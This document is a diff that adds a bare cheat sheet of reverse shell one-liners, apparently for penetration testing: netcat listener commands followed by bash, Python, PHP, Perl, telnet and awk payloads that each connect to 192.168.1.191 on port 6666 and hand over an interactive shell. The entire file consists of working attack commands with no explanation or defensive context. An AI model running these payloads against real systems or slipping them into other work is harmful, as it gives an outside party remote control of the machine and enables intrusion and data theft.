@@ -1,0 +1,18 @@
+nc -lvvp 6666
+
+nc -lnvvp 6666
+
+
+bash -i >& /dev/tcp/192.168.1.191/6666 0>&1 
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.191",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+php -r '$sock=fsockopen("192.168.1.191",6666);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+perl -e 'use Socket;$i="192.168.1.191";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+ telnet 192.168.1.191 6666  | /bin/bash 
+
+
+ awk 'BEGIN{s="/inet/tcp/0/192.168.1.191/6666";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
